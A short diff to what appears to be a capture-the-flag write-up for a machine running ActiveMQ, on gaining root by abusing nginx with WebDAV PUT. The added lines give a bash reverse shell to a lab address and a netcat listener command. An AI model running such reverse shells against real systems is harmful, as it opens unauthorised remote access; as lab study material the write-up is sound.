@@ -12,6 +12,10 @@ Once exploit delivered, just `cat /home/activemq/user.txt`
 ### Obtaining root flag
 Used nginx which user had access to to start nginx server and allow PUT with WebDav
 
+Rev shell on target: `sh -i >& /dev/tcp/10.10.14.131/9001 0>&1`
+
+Listener on host: `rlwrap nc -lvnp 9001`
+
 To open up a stream from local to remote with reverse shell:
 ```shell
 # on remote
